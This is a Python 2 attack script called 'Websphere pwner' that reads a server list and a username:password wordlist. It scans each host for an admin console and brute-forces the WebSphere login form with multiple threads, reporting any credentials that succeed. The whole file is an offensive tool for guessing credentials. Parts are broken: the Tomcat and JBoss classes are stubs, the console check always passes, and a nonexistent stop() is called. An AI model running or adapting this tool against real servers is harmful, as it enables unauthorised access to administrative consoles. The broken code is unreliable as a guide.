import threading
import Queue
import sys
import os
import requests
import time

#-------------------------[Credits]----------------------------#
'''

Dan the man - Developer and founder of project 
Chen the cr0w - Researcher

'''
#--------------------------------------------------------------#

# colors class


class bgcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[1;32;47m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# function of banner


def banner():
    banner = '''
------------------------------------------------------
	+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
	|W|e|b|s|p|h|e|r|e| |p|w|n|e|r|
	+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
	         v1.0.1 alpha
------------------------------------------------------
	'''

    print bgcolors.OKBLUE + banner + bgcolors.ENDC

banner()

#-----------------------------[settings]-----------------------------#

# path of the servers
addresses = open("/home/el4zar/Desktop/servers", "r").read().split()

# wordlist {

# websphere wordlist
ws_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()

# user agent
headers = {
    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0'}

#--------------------------------------------------------------------


# make session
a = requests.Session()

# Local proxy for debugging with Burp-Suite
proxies = {'http': 'http://127.0.0.1:8080'}

# make queue for each class
queue = Queue.Queue()
queue2 = Queue.Queue()
queue3 = Queue.Queue()
queue4 = Queue.Queue()


# application console paths
paths = ['/console']

print "[*] - Searching for servers with webshere"

# websphere brute force class


class BruteForce_ws(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            url = queue2.get()
            for word in ws_wordlist:
                # Split the wordlist by the ':' character
                first_word, second_word = word.split(':')
                # Request parameters to login to websphere
                payload = {'j_username': first_word,
                           'j_password': second_word, 'submit': 'Login'}
                try:
                    # send the request
                    brute_url = a.post(
                        url + "/portal/j_security_check", data=payload, headers=headers)
                    # check if a successfull login was accomplished
                    if (brute_url.status_code == 200) and ('/console/logout.jsp' in brute_url.text):
                        print "\r{}[* Websphere *] - Default password on ip: {} : {}:{}{}".strip("\n").format(bgcolors.OKGREEN, url, first_word, second_word, bgcolors.ENDC)
                except:
                    continue


# tomcat brute force class
class BruteForce_tc(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        print 'hi'
        while True:
            # path = queue2.get() #wait for new path
            # BRUTEFORCE
            print path

# jboss brute force class


class BruteForce_jb(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        print 'hi'

# Search class


class WorkerThread(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    # discover part
    def run(self):
        while not self.queue.empty():
            getdata = self.queue.get()
            for path in paths:
                full = "http://{}{}".format(getdata, path)
                try:
                    r = a.get(full, timeout=2, headers=headers)
                    # check which kind of service is running on the server: jboss, websphere or tomcat:
                    # this check could be improved with more unique checks
                    if '/console' in full:
                        print "\r{}[!] - Found server with admin console at: {} - starting to bruteforce{}".strip("\n").format(bgcolors.OKBLUE, full, bgcolors.ENDC)
                        queue2.put(full)
                except:
                    continue

threads = []

for address in addresses:
    queue.put(address)

# call the websphere brute force class
bf = BruteForce_ws()

# start threads at websphere brute force class
bf.start()

# start threads at websphere brute force class
bf1 = BruteForce_jb()
bf1.start()

for i in range(20):
    t = WorkerThread(queue)
    t.start()
    threads.append(t)

queue.join()

for thread in threads:
    thread.join()

bf.stop()
bf.join()

# bf1.stop()
# bf1.join()
